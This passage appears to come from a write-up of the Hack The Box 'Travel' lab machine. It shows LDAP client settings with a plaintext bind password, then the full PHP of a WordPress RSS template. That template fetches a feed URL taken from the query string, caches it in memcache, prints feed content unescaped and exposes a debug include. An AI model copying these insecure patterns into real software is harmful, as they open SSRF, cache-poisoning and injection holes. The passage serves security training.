ldap_default_authtok = yooxoL8eVoagheich5ug0ne1Oy1Wai
ldap_search_base = ou=linux,ou=servers,dc=travel,dc=htb
ldap_user_search_base = ou=users,ou=linux,ou=servers,dc=travel,dc=htb
ldap_group_search_base = ou=groups,ou=linux,ou=servers,dc=travel,dc=htb

```

## Full PHP Code

`rss_template.php`:

```

<?php
/*
Template Name: Awesome RSS
*/
include('template.php');
get_header();
?>

<main class="section-inner">
    <?php
    function get_feed($url){
     require_once ABSPATH . '/wp-includes/class-simplepie.php';
     $simplepie = null;
     $data = url_get_contents($url);
     if ($url) {
         $simplepie = new SimplePie();
         $simplepie->set_cache_location('memcache://127.0.0.1:11211/?timeout=60&prefix=xct_');
         //$simplepie->set_raw_data($data);
         $simplepie->set_feed_url($url);
         $simplepie->init();
         $simplepie->handle_content_type();
         if ($simplepie->error) {
             error_log($simplepie->error);
             $simplepie = null;
             $failed = True;
         }
     } else {
         $failed = True;
     }
     return $simplepie;
     }

    $url = $_SERVER['QUERY_STRING'];
    if(strpos($url, "custom_feed_url") !== false){
        $tmp = (explode("=", $url));
        $url = end($tmp);
     } else {
        $url = "http://www.travel.htb/newsfeed/customfeed.xml";
     }
     $feed = get_feed($url);
     if ($feed->error())
        {
            echo '<div class="sp_errors">' . "\r\n";
            echo '<p>' . htmlspecialchars($feed->error()) . "</p>\r\n";
            echo '</div>' . "\r\n";
        }
        else {
    ?>
    <div class="chunk focus">
        <h3 class="header">
        <?php
            $link = $feed->get_link();
            $title = $feed->get_title();
            if ($link)
            {
                $title = "<a href='$link' title='$title'>$title</a>";
            }
            echo $title;
        ?>
        </h3>
        <?php echo $feed->get_description(); ?>

    </div>
    <?php foreach($feed->get_items() as $item): ?>
        <div class="chunk">
            <h4><?php if ($item->get_permalink()) echo '<a href="' . $item->get_permalink() . '">'; echo $item->get_title(); if ($item->get_permalink()) echo '</a>'; ?>&nbsp;<span class="footnote"><?php echo $item->get_date('j M Y, g:i a'); ?></span></h4>
            <?php echo $item->get_content(); ?>
            <?php
            if ($enclosure = $item->get_enclosure(0))
            {
                echo '<div align="center">';
                echo '<p>' . $enclosure->embed(array(
                    'audio' => './for_the_demo/place_audio.png',
                    'video' => './for_the_demo/place_video.png',
                    'mediaplayer' => './for_the_demo/mediaplayer.swf',
                    'altclass' => 'download'
                )) . '</p>';
                if ($enclosure->get_link() && $enclosure->get_type())
                {
                    echo '<p class="footnote" align="center">(' . $enclosure->get_type();
                    if ($enclosure->get_size())
                    {
                        echo '; ' . $enclosure->get_size() . ' MB';
                    }
                    echo ')</p>';
                }
                if ($enclosure->get_thumbnail())
                {
                    echo '<div><img src="' . $enclosure->get_thumbnail() . '" alt="" /></div>';
                }
                echo '</div>';
            }
            ?>

        </div>
    <?php endforeach; ?>
<?php } ?>
</main>

<!--
DEBUG
<?php
if (isset($_GET['debug'])){
  include('debug.php');
}
?>
-->

<?php get_template_part( 'template-parts/footer-menus-widgets' ); ?>

<?php
get_footer();

```